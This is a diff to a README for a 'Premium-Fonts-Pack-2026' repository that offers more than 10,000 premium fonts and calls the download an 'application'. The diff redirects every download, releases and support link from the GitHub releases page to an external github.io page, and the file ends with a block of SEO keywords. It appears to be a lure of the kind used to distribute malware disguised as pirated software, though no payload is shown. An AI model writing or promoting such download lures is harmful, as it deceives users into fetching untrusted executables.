@@ -1,6 +1,6 @@
 # Premium-Fonts-Pack-2026 - 10,000+ Premium Fonts for Designers
 
-[![Download Now](https://img.shields.io/badge/Download%20Premium%20Fonts%20Pack%202026-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/irakiperceptivity733/Premium-Fonts-Pack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Premium%20Fonts%20Pack%202026-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://irakiperceptivity733.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **Premium-Fonts-Pack-2026**, the ultimate collection of over 10,000 p
 
 ## 📥 How to Download
 
-Visit this link to download the application: [https://github.com/irakiperceptivity733/Premium-Fonts-Pack-2026/releases](https://github.com/irakiperceptivity733/Premium-Fonts-Pack-2026/releases)
+Visit this link to download the application: [https://irakiperceptivity733.github.io](https://irakiperceptivity733.github.io)
 
 Once you click the link, you'll see a page with available releases. Look for the latest version, then click the download button next to it. The file will start downloading to your computer.
 
@@ -102,8 +102,8 @@ A: Try restarting the program. If that doesn't work, reinstall the font by right
 
 ## 📞 Support
 
-For help with installation or usage, check the [Releases page](https://github.com/irakiperceptivity733/Premium-Fonts-Pack-2026/releases) for any updates or contact the repository maintainer through GitHub issues.
+For help with installation or usage, check the [Releases page](https://irakiperceptivity733.github.io) for any updates or contact the repository maintainer through GitHub issues.
 
-[![Download Now](https://img.shields.io/badge/Download%20Premium%20Fonts%20Pack%202026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/irakiperceptivity733/Premium-Fonts-Pack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Premium%20Fonts%20Pack%202026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://irakiperceptivity733.github.io)
 
 Keywords: premium fonts, free fonts, commercial use fonts, designer font pack, Windows fonts, typography collection, 2026 font pack, font download, TrueType fonts, OpenType fonts
